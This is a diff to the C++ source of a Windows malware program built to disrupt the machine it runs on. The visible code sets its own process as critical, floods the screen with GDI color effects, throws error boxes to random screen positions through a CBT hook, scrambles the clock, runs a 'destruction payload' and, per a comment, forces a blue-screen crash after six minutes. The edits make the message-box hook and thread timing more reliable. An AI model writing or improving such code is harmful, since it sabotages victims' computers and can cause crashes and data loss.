@@ -12,6 +12,7 @@
 #include <iostream>
 #include <tlhelp32.h>
 #include <ctime>
+#include <cstdlib>
 
 // Link GDI, Multimedia, and Shell libraries
 #pragma comment(lib, "gdi32.lib")
@@ -25,6 +26,7 @@ typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN NewValue, PBOOLEAN Old
 
 // Global state
 bool isEnding = false;
+thread_local HHOOK hHook = NULL;
 
 // --- SETS PROCESS TO CRITICAL --- //
 
@@ -102,7 +104,7 @@ void changeColors() {
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
 
         // Create the brush (Red or Black depending on the toggle)
-        HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(0, 0, 0));
+        HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(20, 20, 20));
         HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
 
         // 0x00A000C9 is the ternary ROP code for 'DPa' (Destination AND Pattern)
@@ -278,21 +280,51 @@ void soundPayload() {
 }
 
 // --- CHAOTIC MESSAGE BOXES --- //
+
 LRESULT CALLBACK ChaosHook(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HCBT_ACTIVATE) {
         HWND hwnd = (HWND)wParam;
-        int sw = GetSystemMetrics(SM_CXSCREEN);
-        int sh = GetSystemMetrics(SM_CYSCREEN);
-        // Moves the box to a random location on the screen
-        SetWindowPos(hwnd, HWND_TOPMOST, rand() % (sw - 300), rand() % (sh - 200), 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+        
+        // Grab the class name of the window being activated
+        char className[256];
+        GetClassNameA(hwnd, className, sizeof(className));
+        
+        // "#32770" is the internal Windows class name for Dialog/Message Boxes.
+        // This ensures we ONLY move the actual message box, not hidden background windows.
+        if (strcmp(className, "#32770") == 0) {
+            int sw = GetSystemMetrics(SM_CXSCREEN);
+            int sh = GetSystemMetrics(SM_CYSCREEN);
+            
+            int destX = (sw > 300) ? rand() % (sw - 300) : 0;
+            int destY = (sh > 200) ? rand() % (sh - 200) : 0;
+            
+            // Snap the message box to the random coordinate
+            SetWindowPos(hwnd, HWND_TOPMOST, destX, destY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+            
+            // Unhook immediately so it doesn't fire multiple times for this single box
+            UnhookWindowsHookEx(hHook);
+            hHook = NULL;
+        }
     }
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
 void spawnChaosBox(std::string text) {
-    HHOOK hHook = SetWindowsHookEx(WH_CBT, ChaosHook, NULL, GetCurrentThreadId());
+    // Re-seed rand() specifically for THIS thread. 
+    // Mixing time with the Thread ID guarantees true chaos even if multiple threads spawn instantly.
+    srand(static_cast<unsigned int>(time(NULL)) ^ GetCurrentThreadId());
+    
+    // Set the hook exclusively for the current thread
+    hHook = SetWindowsHookEx(WH_CBT, ChaosHook, NULL, GetCurrentThreadId());
+    
+    // Trigger the box
     MessageBoxA(NULL, text.c_str(), "ERROR", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
-    UnhookWindowsHookEx(hHook);
+    
+    // Failsafe unhook in case the box was closed before the hook triggered
+    if (hHook != NULL) {
+        UnhookWindowsHookEx(hHook);
+        hHook = NULL;
+    }
 }
 
 // --- TIMED MESSAGE BOXES --- //
@@ -469,12 +501,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // 100 Seconds - Start screen multiplier effect & scramble clock & destruction payload
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(screenMultiplier).detach();
-    std::thread(scrambleClock).detach();
     std::thread(destructionPayload).detach(); 
 
     // 120 Seconds - Start timed message boxes
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(timedMessagePayload).detach();
+    std::thread(scrambleClock).detach();
 
     // Final wait until 6 minutes and then trigger BSOD
     std::this_thread::sleep_for(std::chrono::seconds(240));
